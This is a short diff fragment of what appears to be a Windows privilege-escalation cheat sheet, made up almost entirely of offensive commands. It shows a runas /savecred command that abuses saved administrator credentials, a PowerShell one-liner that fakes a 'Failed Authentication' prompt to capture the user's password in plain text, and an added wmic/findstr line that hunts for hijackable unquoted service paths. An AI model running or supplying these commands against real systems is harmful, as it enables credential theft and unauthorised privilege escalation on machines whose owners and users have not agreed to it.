@@ -31,3 +31,5 @@ runas /savecred /user:admin "C:\Windows\System32\cmd.exe /c dir /b /a /s C:\ > c
 ###Create a pop up asking for the user password, if we have a session
 powershell "$cred = $host.ui.promptforcredential('Failed Authentication','', [Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
 
+
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
